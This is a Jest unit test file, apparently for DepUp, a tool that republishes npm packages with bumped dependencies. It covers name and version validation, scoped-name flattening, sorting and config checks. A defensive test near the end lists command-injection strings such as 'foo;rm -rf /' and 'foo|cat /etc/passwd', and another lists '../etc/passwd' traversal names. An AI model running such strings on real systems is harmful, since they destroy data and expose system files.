// Basic functionality tests for DepUp
import path from 'node:path';

import { describe, expect, it } from '@jest/globals';

describe('depUp Basic Tests', () => {
  describe('input Validation', () => {
    it('should validate package names', () => {
      const validNames = ['lodash', 'express', 'package-name'];
      const invalidNames = [
        '',
        null,
        undefined,
        'package with spaces',
        'package@invalid',
      ];

      for (const name of validNames) {
        expect(typeof name).toBe('string');
        expect(name.length).toBeGreaterThan(0);
        expect(/^[\w.-]+$/u.test(name)).toBe(true);
      }

      for (const name of invalidNames) {
        if (name === null || name === undefined) {
          expect(name).toBeFalsy();
        } else if (name === 'package@invalid') {
          expect(/^[\w.-]+$/u.test(name)).toBe(false);
        } else {
          expect(/^[\w.-]+$/u.test(name)).toBe(false);
        }
      }
    });

    it('should validate version strings', () => {
      const validVersions = [
        '1.0.0',
        '1.0.0-beta.1',
        '1.0.0-alpha.1',
        '1.0.0-rc.1',
      ];
      const invalidVersions = [
        '',
        '1.0',
        '1.0.0.0.0',
        'v1.0.0',
        '1.0.0+invalid',
      ];

      for (const version of validVersions) {
        expect(typeof version).toBe('string');
        expect(version.length).toBeGreaterThan(0);
        expect(/^\d+\.\d+\.\d+(-[\d.A-Za-z-]+)?$/u.test(version)).toBe(true);
      }

      for (const version of invalidVersions) {
        expect(/^\d+\.\d+\.\d+(-[\d.A-Za-z-]+)?$/u.test(version)).toBe(false);
      }
    });
  });

  describe('configuration Validation', () => {
    it('should validate numeric configuration values', () => {
      const numericFields = [
        'rateLimitDelay',
        'maxPackagesPerRun',
        'maxPackagesPerDiscovery',
        'timeout',
        'retryAttempts',
        'retryDelay',
      ];

      for (const field of numericFields) {
        const validValue = 1000;
        const invalidValue = -1;
        const invalidType = 'not-a-number';

        expect(typeof validValue).toBe('number');
        expect(validValue).toBeGreaterThanOrEqual(0);

        expect(typeof invalidValue).toBe('number');
        expect(invalidValue).toBeLessThan(0);

        expect(typeof invalidType).toBe('string');
        expect(isNaN(Number(invalidType))).toBe(true);
      }
    });

    it('should validate boolean configuration values', () => {
      const booleanFields = [
        'publish.enabled',
        'testing.enabled',
        'discovery.enabled',
        'integrity.enabled',
      ];

      for (const field of booleanFields) {
        const validValue = true;
        const invalidValue = 'not-a-boolean';

        expect(typeof validValue).toBe('boolean');
        expect(typeof invalidValue).toBe('string');
        expect(typeof invalidValue).not.toBe('boolean');
      }
    });
  });

  describe('error Handling', () => {
    it('should handle timeout errors', () => {
      const timeoutError = new Error('Operation timed out');

      expect(timeoutError.message).toContain('timed out');
      expect(timeoutError instanceof Error).toBe(true);
    });

    it('should handle validation errors', () => {
      const validationError = new Error('Invalid input provided');

      expect(validationError.message).toContain('Invalid');
      expect(validationError instanceof Error).toBe(true);
    });

    it('should handle network errors', () => {
      const networkError = new Error('Network request failed');

      expect(networkError.message).toContain('Network');
      expect(networkError instanceof Error).toBe(true);
    });
  });

  describe('string Utilities', () => {
    it('should sanitize package names', () => {
      const sanitizePackageName = (name) => {
        return name.replaceAll(/[^\w.@-]/gu, '');
      };

      expect(sanitizePackageName('lodash')).toBe('lodash');
      expect(sanitizePackageName('@scope/package')).toBe('@scopepackage');
      expect(sanitizePackageName('package-name')).toBe('package-name');
      expect(sanitizePackageName('package with spaces')).toBe(
        'packagewithspaces',
      );
      expect(sanitizePackageName('package@invalid!')).toBe('package@invalid');
    });

    it('should sanitize version strings', () => {
      const sanitizeVersion = (version) => {
        return version.replaceAll(/[^\w.-]/gu, '');
      };

      expect(sanitizeVersion('1.0.0')).toBe('1.0.0');
      expect(sanitizeVersion('1.0.0-beta.1')).toBe('1.0.0-beta.1');
      expect(sanitizeVersion('1.0.0+invalid')).toBe('1.0.0invalid');
      expect(sanitizeVersion('1.0.0@invalid')).toBe('1.0.0invalid');
    });
  });

  describe('path Utilities', () => {
    it('should construct package paths correctly', () => {
      const constructPackagePath = (packageName, version, revision) => {
        return `${packageName}/${version}/rev-${revision}`;
      };

      expect(constructPackagePath('lodash', '4.17.21', 0)).toBe(
        'lodash/4.17.21/rev-0',
      );
      expect(constructPackagePath('express', '5.0.0', 1)).toBe(
        'express/5.0.0/rev-1',
      );
    });

    it('should construct scoped package names correctly', () => {
      // Flatten scoped names: @scope/name -> scope__name
      const constructScopedName = (packageName) => {
        const flatName = packageName.startsWith('@')
          ? packageName.slice(1).replace(/\//u, '__')
          : packageName;
        return `@depup/${flatName}`;
      };

      expect(constructScopedName('lodash')).toBe('@depup/lodash');
      expect(constructScopedName('express')).toBe('@depup/express');
      expect(constructScopedName('@scope/package')).toBe(
        '@depup/scope__package',
      );
      expect(constructScopedName('@nestjs/common')).toBe(
        '@depup/nestjs__common',
      );
    });
  });

  describe('version Comparison', () => {
    it('should compare version strings correctly', () => {
      const compareVersions = (a, b) => {
        const aParts = a.split('.').map(Number);
        const bParts = b.split('.').map(Number);

        for (
          let index = 0;
          index < Math.max(aParts.length, bParts.length);
          index++
        ) {
          const aPart = aParts[index] || 0;
          const bPart = bParts[index] || 0;

          if (aPart > bPart) {
            return 1;
          }
          if (aPart < bPart) {
            return -1;
          }
        }
        return 0;
      };

      expect(compareVersions('1.0.0', '1.0.0')).toBe(0);
      expect(compareVersions('1.0.1', '1.0.0')).toBe(1);
      expect(compareVersions('1.0.0', '1.0.1')).toBe(-1);
      expect(compareVersions('2.0.0', '1.9.9')).toBe(1);
    });

    it('should format DepUp version strings correctly', () => {
      const formatDepUpVersion = (baseVersion, revision) => {
        return `${baseVersion}-depup.${revision}`;
      };

      expect(formatDepUpVersion('1.0.0', 0)).toBe('1.0.0-depup.0');
      expect(formatDepUpVersion('1.0.0', 1)).toBe('1.0.0-depup.1');
      expect(formatDepUpVersion('2.1.3', 5)).toBe('2.1.3-depup.5');
    });

    it('should convert old version format to new format', () => {
      const convertVersionFormat = (oldVersion) => {
        return oldVersion.replace(/_(\d+)$/u, '-depup.$1');
      };

      expect(convertVersionFormat('1.0.0_0')).toBe('1.0.0-depup.0');
      expect(convertVersionFormat('1.0.0_1')).toBe('1.0.0-depup.1');
      expect(convertVersionFormat('2.1.3_5')).toBe('2.1.3-depup.5');
      expect(convertVersionFormat('1.0.0-depup.0')).toBe('1.0.0-depup.0');
    });
  });

  describe('integrity Scoring', () => {
    it('should calculate integrity scores correctly', () => {
      const calculateScore = (up, down, neutral) => {
        const total = up + down + neutral;
        return total > 0 ? Math.round(((up - down) / total) * 100) : 0;
      };

      expect(calculateScore(10, 0, 0)).toBe(100);
      expect(calculateScore(8, 2, 0)).toBe(60);
      expect(calculateScore(5, 5, 0)).toBe(0);
      expect(calculateScore(2, 8, 0)).toBe(-60);
      expect(calculateScore(0, 0, 0)).toBe(0);
    });

    it('should determine status emoji correctly', () => {
      const getStatusEmoji = (score) => {
        if (score >= 80) {
          return '🟢';
        }
        if (score >= 60) {
          return '🟡';
        }
        if (score >= 40) {
          return '🟠';
        }
        return '🔴';
      };

      expect(getStatusEmoji(85)).toBe('🟢');
      expect(getStatusEmoji(70)).toBe('🟡');
      expect(getStatusEmoji(50)).toBe('🟠');
      expect(getStatusEmoji(30)).toBe('🔴');
    });
  });

  describe('discoverability Metadata', () => {
    it('should add depup keywords while preserving originals', () => {
      const originalKeywords = ['utility', 'lodash'];
      const depupKeywords = [
        'depup',
        'dependency-bumped',
        'updated-deps',
        'lodash',
      ];
      const merged = [...new Set([...depupKeywords, ...originalKeywords])];

      expect(merged).toContain('depup');
      expect(merged).toContain('dependency-bumped');
      expect(merged).toContain('updated-deps');
      expect(merged).toContain('utility');
      expect(merged).toContain('lodash');
      // No duplicates
      expect(merged.filter((k) => k === 'lodash')).toHaveLength(1);
    });

    it('should prefix description with [DepUp]', () => {
      const original = 'A utility library';
      const prefixed = `[DepUp] ${original}`;

      expect(prefixed).toBe('[DepUp] A utility library');
      expect(prefixed.startsWith('[DepUp]')).toBe(true);
    });

    it('should generate fallback description for packages without one', () => {
      const packageName = 'lodash';
      const fallback = `[DepUp] Dependency-bumped version of ${packageName}`;

      expect(fallback).toBe('[DepUp] Dependency-bumped version of lodash');
    });
  });

  describe('depup Metadata', () => {
    it('should construct depup metadata field correctly', () => {
      const metadata = {
        changes: { axios: { from: '^1.0.0', to: '^2.0.0' } },
        depsUpdated: 1,
        originalPackage: 'express',
        originalVersion: '4.18.2',
        processedAt: '2026-03-08T00:00:00.000Z',
        smokeTest: 'passed',
      };

      expect(metadata.originalPackage).toBe('express');
      expect(metadata.originalVersion).toBe('4.18.2');
      expect(metadata.depsUpdated).toBe(1);
      expect(metadata.smokeTest).toBe('passed');
      expect(metadata.changes.axios.from).toBe('^1.0.0');
      expect(metadata.changes.axios.to).toBe('^2.0.0');
    });

    it('should return correct smoke test statuses', () => {
      const statuses = ['passed', 'failed', 'skipped'];
      for (const status of statuses) {
        expect(typeof status).toBe('string');
        expect(statuses).toContain(status);
      }
    });
  });

  describe('publish Tag Logic', () => {
    it('should identify depup prerelease versions', () => {
      const isDepupVersion = (version) => {
        const match = version.match(/-depup\.\d+$/u);
        return match !== null;
      };

      expect(isDepupVersion('1.0.0-depup.0')).toBe(true);
      expect(isDepupVersion('2.1.3-depup.5')).toBe(true);
      expect(isDepupVersion('1.0.0-beta.1')).toBe(false);
      expect(isDepupVersion('1.0.0')).toBe(false);
    });

    it('should select correct publish tag', () => {
      const getPublishTag = (version) => {
        const isDepup = /-depup\.\d+$/u.test(version);
        const isPrerelease = /-/u.test(version);

        if (isDepup) {
          return 'latest';
        }
        if (isPrerelease) {
          return 'beta';
        }
        return '';
      };

      expect(getPublishTag('1.0.0-depup.0')).toBe('latest');
      expect(getPublishTag('1.0.0-beta.1')).toBe('beta');
      expect(getPublishTag('1.0.0')).toBe('');
    });
  });

  describe('rate Limiting', () => {
    it('should calculate delays correctly', () => {
      const calculateDelay = (baseDelay, attempt) => {
        return baseDelay * 2 ** attempt;
      };

      expect(calculateDelay(1000, 0)).toBe(1000);
      expect(calculateDelay(1000, 1)).toBe(2000);
      expect(calculateDelay(1000, 2)).toBe(4000);
      expect(calculateDelay(1000, 3)).toBe(8000);
    });

    it('should respect maximum delay limits', () => {
      const calculateDelayWithLimit = (baseDelay, attempt, maxDelay) => {
        const delay = baseDelay * 2 ** attempt;
        return Math.min(delay, maxDelay);
      };

      expect(calculateDelayWithLimit(1000, 0, 5000)).toBe(1000);
      expect(calculateDelayWithLimit(1000, 1, 5000)).toBe(2000);
      expect(calculateDelayWithLimit(1000, 2, 5000)).toBe(4000);
      expect(calculateDelayWithLimit(1000, 3, 5000)).toBe(5000);
    });
  });

  describe('scoped Package Name Flattening', () => {
    it('should flatten scoped package names with double underscore', () => {
      const toScopedName = (packageName) => {
        const flatName = packageName.startsWith('@')
          ? packageName.slice(1).replace(/\//u, '__')
          : packageName;
        return `@depup/${flatName}`;
      };

      expect(toScopedName('lodash')).toBe('@depup/lodash');
      expect(toScopedName('express')).toBe('@depup/express');
      expect(toScopedName('@nestjs/common')).toBe('@depup/nestjs__common');
      expect(toScopedName('@babel/core')).toBe('@depup/babel__core');
      expect(toScopedName('@angular/core')).toBe('@depup/angular__core');
      expect(toScopedName('@aws-sdk/client-s3')).toBe(
        '@depup/aws-sdk__client-s3',
      );
    });

    it('should handle edge cases in name flattening', () => {
      const toScopedName = (packageName) => {
        const flatName = packageName.startsWith('@')
          ? packageName.slice(1).replace(/\//u, '__')
          : packageName;
        return `@depup/${flatName}`;
      };

      // Package with underscores already
      expect(toScopedName('my_package')).toBe('@depup/my_package');
      // Package with dots
      expect(toScopedName('lodash.merge')).toBe('@depup/lodash.merge');
      // Short scoped name
      expect(toScopedName('@a/b')).toBe('@depup/a__b');
    });
  });

  describe('semver Version Sorting', () => {
    it('should sort versions correctly with semver comparison', () => {
      const semverCompare = (a, b) => {
        const aParts = a.split('.').map(Number);
        const bParts = b.split('.').map(Number);
        for (
          let index = 0;
          index < Math.max(aParts.length, bParts.length);
          index++
        ) {
          const aPart = aParts[index] || 0;
          const bPart = bParts[index] || 0;
          if (aPart !== bPart) {
            return aPart - bPart;
          }
        }
        return 0;
      };

      const versions = ['2.0.0', '10.0.0', '1.0.0', '9.0.0'];
      const sorted = versions.toSorted(semverCompare);

      expect(sorted).toStrictEqual(['1.0.0', '2.0.0', '9.0.0', '10.0.0']);
      expect(sorted.at(-1)).toBe('10.0.0');
    });

    it('should not confuse lexicographic and numeric sorting', () => {
      const versions = ['1.2.0', '1.10.0', '1.9.0'];
      const lexSorted = versions.toSorted();
      const numberSorted = versions.toSorted((a, b) => {
        const aParts = a.split('.').map(Number);
        const bParts = b.split('.').map(Number);
        for (
          let index = 0;
          index < Math.max(aParts.length, bParts.length);
          index++
        ) {
          if ((aParts[index] || 0) !== (bParts[index] || 0)) {
            return (aParts[index] || 0) - (bParts[index] || 0);
          }
        }
        return 0;
      });

      // Lexicographic is WRONG for versions
      expect(lexSorted).toStrictEqual(['1.10.0', '1.2.0', '1.9.0']);
      // Numeric is CORRECT
      expect(numberSorted).toStrictEqual(['1.2.0', '1.9.0', '1.10.0']);
    });
  });

  describe('revision Directory Sorting', () => {
    it('should sort rev directories numerically not lexicographically', () => {
      const revDirectories = ['rev-0', 'rev-1', 'rev-10', 'rev-2', 'rev-9'];
      const sorted = revDirectories.toSorted((a, b) => {
        const aNumber = Number.parseInt(a.split('-')[1], 10);
        const bNumber = Number.parseInt(b.split('-')[1], 10);
        return aNumber - bNumber;
      });

      expect(sorted).toStrictEqual([
        'rev-0',
        'rev-1',
        'rev-2',
        'rev-9',
        'rev-10',
      ]);
      expect(sorted.at(-1)).toBe('rev-10');
    });

    it('should demonstrate lexicographic sorting is wrong for revisions', () => {
      const revDirectories = ['rev-0', 'rev-1', 'rev-10', 'rev-2', 'rev-9'];
      const lexSorted = revDirectories.toSorted();

      // Lexicographic puts rev-10 before rev-2 (WRONG)
      expect(lexSorted).toStrictEqual([
        'rev-0',
        'rev-1',
        'rev-10',
        'rev-2',
        'rev-9',
      ]);
      expect(lexSorted.at(-1)).toBe('rev-9'); // Wrong! Should be rev-10
    });
  });

  describe('scoped Package Spec Parsing', () => {
    it('should parse package names from specs correctly', () => {
      const parsePackageName = (packageSpec) => {
        if (packageSpec.startsWith('@')) {
          const withoutLeadingAt = packageSpec.slice(1);
          const atIndex = withoutLeadingAt.indexOf('@');
          if (atIndex === -1) {
            return packageSpec;
          }
          return `@${withoutLeadingAt.slice(0, atIndex)}`;
        }
        return packageSpec.split('@')[0];
      };

      // Unscoped without version
      expect(parsePackageName('lodash')).toBe('lodash');
      // Unscoped with version
      expect(parsePackageName('lodash@4.17.21')).toBe('lodash');
      // Scoped without version
      expect(parsePackageName('@nestjs/common')).toBe('@nestjs/common');
      // Scoped with version
      expect(parsePackageName('@nestjs/common@10.0.0')).toBe('@nestjs/common');
      // Scoped with complex version
      expect(parsePackageName('@angular/core@17.0.0-rc.1')).toBe(
        '@angular/core',
      );
    });

    it('should NOT return empty string for scoped packages', () => {
      // This was the original bug: split('@')[0] returns '' for @scope/name
      const brokenParse = (spec) => spec.split('@')[0];
      const fixedParse = (spec) => {
        if (spec.startsWith('@')) {
          const withoutAt = spec.slice(1);
          const atIndex = withoutAt.indexOf('@');
          if (atIndex === -1) {
            return spec;
          }
          return `@${withoutAt.slice(0, atIndex)}`;
        }
        return spec.split('@')[0];
      };

      // Broken: returns empty string
      expect(brokenParse('@nestjs/common')).toBe('');
      // Fixed: returns correct name
      expect(fixedParse('@nestjs/common')).toBe('@nestjs/common');
    });
  });

  describe('publish Readme Scoped Names', () => {
    it('should use flattened name in install command', () => {
      const toScopedName = (packageName) => {
        const flatName = packageName.startsWith('@')
          ? packageName.slice(1).replace(/\//u, '__')
          : packageName;
        return `@depup/${flatName}`;
      };

      // Scoped package install command should use flattened name
      const scopedInstall = `npm install ${toScopedName('@nestjs/common')}`;

      expect(scopedInstall).toBe('npm install @depup/nestjs__common');
      // NOT the broken version:
      expect(scopedInstall).not.toBe('npm install @depup/@nestjs/common');

      // Unscoped should work the same as before
      const unscopedInstall = `npm install ${toScopedName('lodash')}`;

      expect(unscopedInstall).toBe('npm install @depup/lodash');
    });
  });

  describe('activity Date Edge Cases', () => {
    it('should handle Never as last activity without NaN', () => {
      const lastActivity = 'Never';

      // new Date('Never') produces Invalid Date
      const invalidDate = new Date(lastActivity);

      expect(Number.isNaN(invalidDate.getTime())).toBe(true);

      // Arithmetic with NaN silently passes checks (the bug)
      const nanDays =
        (Date.now() - invalidDate.getTime()) / (1000 * 60 * 60 * 24);

      expect(Number.isNaN(nanDays)).toBe(true);

      // NaN comparisons always return false -- this is the silent bug
      // The guard (nanDays > 7) would silently pass, hiding system inactivity
      const wouldTriggerWarning = nanDays > 7;

      expect(wouldTriggerWarning).toBe(false);

      // Correct approach: guard against 'Never' string
      const getIssues = (activity) => {
        if (activity === 'Never') {
          return ['System has never recorded any activity'];
        }
        const date = new Date(activity);
        const days = (Date.now() - date.getTime()) / (1000 * 60 * 60 * 24);
        if (days > 7) {
          return [`System inactive for ${Math.round(days)} days`];
        }
        return [];
      };

      expect(getIssues('Never')).toStrictEqual([
        'System has never recorded any activity',
      ]);
    });
  });

  describe('shard Configuration Validation', () => {
    it('should reject invalid shard configurations', () => {
      const validateShard = (index, total) =>
        !Number.isNaN(index) &&
        !Number.isNaN(total) &&
        total >= 1 &&
        index >= 0 &&
        index < total;

      // Valid configs
      expect(validateShard(0, 1)).toBe(true);
      expect(validateShard(0, 5)).toBe(true);
      expect(validateShard(4, 5)).toBe(true);

      // Invalid: NaN
      expect(validateShard(Number.NaN, 5)).toBe(false);
      expect(validateShard(0, Number.NaN)).toBe(false);

      // Invalid: out of range
      expect(validateShard(5, 5)).toBe(false);
      expect(validateShard(-1, 5)).toBe(false);
      expect(validateShard(0, 0)).toBe(false);
      expect(validateShard(0, -1)).toBe(false);
    });
  });

  describe('config Numeric Validation', () => {
    it('should reject Infinity in numeric fields', () => {
      const validateNumeric = (value) => {
        const number_ = Number(value);
        return Number.isFinite(number_) && number_ >= 0;
      };

      expect(validateNumeric(100)).toBe(true);
      expect(validateNumeric(0)).toBe(true);
      expect(validateNumeric('500')).toBe(true);

      // These should all fail
      expect(validateNumeric('Infinity')).toBe(false);
      expect(validateNumeric('-Infinity')).toBe(false);
      expect(validateNumeric('abc')).toBe(false);
      expect(validateNumeric(-1)).toBe(false);
    });
  });

  describe('version Directory Matching', () => {
    it('should match both plain and prerelease version directories', () => {
      const isVersionDirectory = (name) => /^\d+\.\d+\.\d+/u.test(name);

      // Plain semver
      expect(isVersionDirectory('1.0.0')).toBe(true);
      expect(isVersionDirectory('4.17.21')).toBe(true);

      // Prerelease versions (directory names from original packages)
      expect(isVersionDirectory('5.0.0-rc.1')).toBe(true);
      expect(isVersionDirectory('1.0.0-beta.1')).toBe(true);
      expect(isVersionDirectory('1.0.0-depup.0')).toBe(true);

      // Not version directories
      expect(isVersionDirectory('node_modules')).toBe(false);
      expect(isVersionDirectory('.git')).toBe(false);
      expect(isVersionDirectory('rev-0')).toBe(false);
    });
  });

  describe('config validateArrayFields Optional Chaining', () => {
    it('should not throw when config sections are missing', () => {
      const validateArrayFields = (validated) => {
        if (
          validated.discovery?.packages &&
          !Array.isArray(validated.discovery.packages)
        ) {
          throw new Error('discovery.packages must be an array');
        }

        if (
          validated.testing?.methods &&
          !Array.isArray(validated.testing.methods)
        ) {
          throw new Error('testing.methods must be an array');
        }

        if (
          validated.security?.allowLicenses &&
          !Array.isArray(validated.security.allowLicenses)
        ) {
          throw new Error('security.allowLicenses must be an array');
        }
      };

      // Missing sections should not throw (optional chaining)
      expect(() => validateArrayFields({})).not.toThrow();
      expect(() => validateArrayFields({ discovery: {} })).not.toThrow();

      // Without optional chaining this would throw TypeError
      expect(() => validateArrayFields({ testing: undefined })).not.toThrow();

      // Invalid values should still throw
      expect(() =>
        validateArrayFields({ discovery: { packages: 'not-array' } }),
      ).toThrow('must be an array');
    });
  });

  describe('symlink Handling in File Scanning', () => {
    it('should skip symlinks and only include regular files', () => {
      const items = [
        {
          isDirectory: () => false,
          isSymbolicLink: () => false,
          name: 'file.js',
        },
        {
          isDirectory: () => false,
          isSymbolicLink: () => true,
          name: 'link.js',
        },
        { isDirectory: () => true, isSymbolicLink: () => false, name: 'src' },
        {
          isDirectory: () => false,
          isSymbolicLink: () => true,
          name: 'danger',
        },
        {
          isDirectory: () => false,
          isSymbolicLink: () => false,
          name: 'safe.txt',
        },
      ];

      const files = [];
      for (const item of items) {
        if (item.isSymbolicLink()) {
          // Skip symlinks
        } else if (!item.isDirectory()) {
          files.push(item.name);
        }
      }

      expect(files).toStrictEqual(['file.js', 'safe.txt']);
    });
  });

  describe('fetchPackageVersion Undefined Guard', () => {
    it('should fall back to 0.0.0 when version is undefined', () => {
      const getVersion = (manifest) =>
        manifest['dist-tags']?.latest || manifest.version || '0.0.0';

      expect(getVersion({ 'dist-tags': { latest: '2.0.0' } })).toBe('2.0.0');
      expect(getVersion({ version: '1.0.0' })).toBe('1.0.0');

      // Malformed manifest with no version info
      expect(getVersion({})).toBe('0.0.0');
      expect(getVersion({ 'dist-tags': {} })).toBe('0.0.0');
    });
  });

  describe('dead Code Removal - Dependencies Copy', () => {
    it('should use packageJson.dependencies directly without unused copy', () => {
      const packageJson = {
        dependencies: { express: '^4.0.0', lodash: '^4.17.0' },
      };

      // The fix removes `const dependencies = { ...packageJson.dependencies }`
      // and uses Object.entries(packageJson.dependencies) directly
      const entries = Object.entries(packageJson.dependencies);

      expect(entries).toHaveLength(2);

      // Mutating packageJson.dependencies directly (as updateSingleDependency does)
      packageJson.dependencies.express = '^5.0.0';

      expect(packageJson.dependencies.express).toBe('^5.0.0');
    });
  });

  describe('heal Integrity Classification', () => {
    it('should classify corrupt JSON as corruptIntegrity not missingIntegrity', () => {
      // Simulates the fixed logic: fileExists flag set BEFORE JSON.parse
      const classifyIntegrity = (fileReadSucceeds, jsonParseSucceeds) => {
        let fileExists = false;
        try {
          if (!fileReadSucceeds) {
            throw new Error('ENOENT');
          }
          fileExists = true;
          if (!jsonParseSucceeds) {
            throw new Error('Unexpected token');
          }
          return 'valid';
        } catch {
          return fileExists ? 'corrupt' : 'missing';
        }
      };

      expect(classifyIntegrity(true, true)).toBe('valid');
      expect(classifyIntegrity(false, false)).toBe('missing');

      // Key test: file exists but JSON is corrupt
      expect(classifyIntegrity(true, false)).toBe('corrupt');
    });
  });

  describe('cli Config Set Value Parsing', () => {
    it('should reject empty values after equals sign', () => {
      const parseConfigSet = (input) => {
        const [configPath, ...rest] = input.split('=');
        const value = rest.join('=');
        return { configPath, valid: Boolean(configPath && value), value };
      };

      expect(parseConfigSet('timeout=5000').valid).toBe(true);
      expect(parseConfigSet('timeout=5000').value).toBe('5000');

      // Empty value should be invalid
      expect(parseConfigSet('timeout=').valid).toBe(false);

      // No equals sign
      expect(parseConfigSet('timeout').valid).toBe(false);

      // Value containing equals (e.g., URLs)
      expect(parseConfigSet('registry=https://registry.npmjs.org/').valid).toBe(
        true,
      );
      expect(parseConfigSet('registry=https://registry.npmjs.org/').value).toBe(
        'https://registry.npmjs.org/',
      );
    });
  });

  describe('semver.valid filtering for integrity keys', () => {
    it('should filter out non-semver keys from integrity data', () => {
      const semverRegex = /^\d+\.\d+\.\d+/u;
      const integrityKeys = ['1.0.0', 'not-a-version', '2.0.0', '', 'abc'];
      const filtered = integrityKeys.filter((v) => semverRegex.test(v));

      expect(filtered).toStrictEqual(['1.0.0', '2.0.0']);
    });
  });

  describe('rev directory regex filter', () => {
    it('should only match rev-N directories with numeric suffix', () => {
      const revRegex = /^rev-\d+$/u;

      expect(revRegex.test('rev-0')).toBe(true);
      expect(revRegex.test('rev-10')).toBe(true);
      expect(revRegex.test('rev-')).toBe(false);
      expect(revRegex.test('rev-abc')).toBe(false);
      expect(revRegex.test('revision-1')).toBe(false);
    });
  });

  describe('path traversal prevention', () => {
    it('should reject package names containing path traversal', () => {
      const names = ['../etc/passwd', '..', 'foo/../bar', '@scope/..'];
      for (const name of names) {
        expect(name).toContain('..');
      }
      const safeName = 'lodash';

      expect(safeName).not.toContain('..');

      const scopedName = '@babel/core';

      expect(scopedName).not.toContain('..');
    });
  });

  describe('package spec input validation', () => {
    it('should reject dangerous characters in package spec', () => {
      const dangerousChars = /[;`$|><\\{}[\]!#%^&*()='"]/u;

      expect(dangerousChars.test('foo;rm -rf /')).toBe(true);
      expect(dangerousChars.test('foo`whoami`')).toBe(true);
      expect(dangerousChars.test('foo$(whoami)')).toBe(true);
      expect(dangerousChars.test('foo|cat /etc/passwd')).toBe(true);

      expect(dangerousChars.test('express')).toBe(false);
      expect(dangerousChars.test('@babel/core')).toBe(false);
      expect(dangerousChars.test('socket.io')).toBe(false);
      expect(dangerousChars.test('is-odd')).toBe(false);
      expect(dangerousChars.test('express@4.21.0')).toBe(false);
      expect(dangerousChars.test('@nestjs/common@latest')).toBe(false);
    });
  });

  describe('revision filtering', () => {
    it('should use strict regex to reject non-numeric revision keys', () => {
      const revisionFilter = (key) => /^\d+$/u.test(key);

      expect(revisionFilter('0')).toBe(true);
      expect(revisionFilter('3')).toBe(true);
      expect(revisionFilter('10')).toBe(true);
      expect(revisionFilter('3abc')).toBe(false);
      expect(revisionFilter('abc')).toBe(false);
      expect(revisionFilter('')).toBe(false);
      expect(revisionFilter('rev-0')).toBe(false);
    });
  });

  describe('naN date guard', () => {
    it('should detect invalid dates before formatting', () => {
      const formatDate = (timestamp) => {
        if (!timestamp) {
          return 'unknown';
        }
        const date = new Date(timestamp);
        if (Number.isNaN(date.getTime())) {
          return 'unknown';
        }
        return date.toLocaleDateString();
      };

      expect(formatDate()).toBe('unknown');
      expect(formatDate('Never')).toBe('unknown');
      expect(formatDate('invalid-date')).toBe('unknown');
      expect(formatDate('2024-01-01')).not.toBe('unknown');
      expect(formatDate(new Date().toISOString())).not.toBe('unknown');
    });
  });

  describe('non-object data type guards', () => {
    it('should handle corrupted integrity data entries', () => {
      const integrityData = {
        '1.0.0': { 0: { integrity: { score: 90 } } },
        '2.0.0': 'corrupted',
        '3.0.0': null,
        '4.0.0': { 0: null, 1: 'bad' },
      };

      const validEntries = Object.values(integrityData)
        .filter((v) => typeof v === 'object' && v !== null)
        .flatMap((v) => Object.values(v))
        .filter((d) => typeof d === 'object' && d !== null);

      expect(validEntries).toHaveLength(1);
    });
  });

  describe('non-semver specifier guard in dep bumping', () => {
    it('should detect npm aliases and protocol specifiers', async () => {
      const { isNonSemverSpecifier } = await import('../utilities.mjs');

      expect(isNonSemverSpecifier('npm:@types/react@^18.0.0')).toBe(true);
      expect(isNonSemverSpecifier('git+https://github.com/foo.git')).toBe(true);
      expect(isNonSemverSpecifier('file:../local')).toBe(true);
      expect(isNonSemverSpecifier('workspace:*')).toBe(true);

      expect(isNonSemverSpecifier('^1.0.0')).toBe(false);
      expect(isNonSemverSpecifier('~2.3.4')).toBe(false);
      expect(isNonSemverSpecifier('1.0.0')).toBe(false);
    });
  });

  describe('case-insensitive package removal', () => {
    it('should match packages regardless of case', () => {
      const packages = ['lodash', 'Express', 'react'];
      const toRemove = 'express';
      const lowerToRemove = toRemove.toLowerCase();
      const result = packages.filter((p) => p.toLowerCase() !== lowerToRemove);

      expect(result).toStrictEqual(['lodash', 'react']);
    });
  });

  describe('utilities module', () => {
    it('should export flattenPackageName correctly', async () => {
      const { flattenPackageName } = await import('../utilities.mjs');

      expect(flattenPackageName('lodash')).toBe('lodash');
      expect(flattenPackageName('express')).toBe('express');
      expect(flattenPackageName('@nestjs/common')).toBe('nestjs__common');
      expect(flattenPackageName('@babel/core')).toBe('babel__core');
      expect(flattenPackageName('@a/b')).toBe('a__b');
    });

    it('should export toScopedName correctly', async () => {
      const { toScopedName } = await import('../utilities.mjs');

      expect(toScopedName('lodash')).toBe('@depup/lodash');
      expect(toScopedName('express')).toBe('@depup/express');
      expect(toScopedName('@nestjs/common')).toBe('@depup/nestjs__common');
      expect(toScopedName('@babel/core')).toBe('@depup/babel__core');
    });

    it('should export isNonSemverSpecifier correctly', async () => {
      const { isNonSemverSpecifier } = await import('../utilities.mjs');

      expect(isNonSemverSpecifier('npm:@types/react@^18.0.0')).toBe(true);
      expect(isNonSemverSpecifier('git+https://github.com/foo/bar.git')).toBe(
        true,
      );
      expect(isNonSemverSpecifier('file:../local-pkg')).toBe(true);
      expect(isNonSemverSpecifier('workspace:*')).toBe(true);
      expect(isNonSemverSpecifier('github:user/repo')).toBe(true);
      expect(isNonSemverSpecifier('http://example.com/pkg.tgz')).toBe(true);
      expect(isNonSemverSpecifier('https://example.com/pkg.tgz')).toBe(true);
      expect(isNonSemverSpecifier('link:../other')).toBe(true);
      expect(isNonSemverSpecifier('^1.0.0')).toBe(false);
      expect(isNonSemverSpecifier('~2.3.4')).toBe(false);
      expect(isNonSemverSpecifier('>=1.0.0')).toBe(false);
      expect(isNonSemverSpecifier()).toBe(true);
      expect(isNonSemverSpecifier(null)).toBe(true);
      expect(isNonSemverSpecifier(123)).toBe(true);
    });

    it('should export getShardConfig correctly', async () => {
      const { getShardConfig } = await import('../utilities.mjs');

      const originalIndex = process.env.SHARD_INDEX;
      const originalTotal = process.env.SHARD_TOTAL;
      delete process.env.SHARD_INDEX;
      delete process.env.SHARD_TOTAL;

      const config = getShardConfig();

      expect(config).toStrictEqual({ shardIndex: 0, shardTotal: 1 });

      process.env.SHARD_INDEX = '2';
      process.env.SHARD_TOTAL = '5';
      const config2 = getShardConfig();

      expect(config2).toStrictEqual({ shardIndex: 2, shardTotal: 5 });

      process.env.SHARD_INDEX = '5';
      process.env.SHARD_TOTAL = '5';

      expect(() => getShardConfig()).toThrow('Invalid shard configuration');

      if (originalIndex === undefined) {
        delete process.env.SHARD_INDEX;
      } else {
        process.env.SHARD_INDEX = originalIndex;
      }
      if (originalTotal === undefined) {
